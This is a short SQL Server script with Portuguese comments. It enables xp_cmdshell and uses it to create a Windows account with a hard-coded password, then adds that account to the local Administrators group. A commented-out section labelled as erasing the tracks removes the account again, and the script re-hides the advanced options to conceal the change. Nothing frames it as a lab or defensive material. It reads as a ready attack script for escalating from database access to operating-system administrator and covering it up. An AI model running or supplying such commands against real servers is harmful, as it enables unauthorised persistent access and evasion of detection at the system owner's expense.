-- show advanced options
EXEC sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
-- enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO
-- hide advanced options
EXEC sp_configure 'show advanced options', 0
GO
RECONFIGURE
GO

-- Cria usuario
xp_cmdshell 'NET USER fcmarques #DBACorp123 /ADD'

-- Adiciona ao grupo dos administradores
xp_cmdshell 'net localgroup Administrators fcmarques /add'

--Apagando os rastros
/*
xp_cmdshell 'NET USER fcmarques /DEL'

-- show advanced options
EXEC sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
-- enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO
-- hide advanced options
EXEC sp_configure 'show advanced options', 0
GO
RECONFIGURE
GO
*/

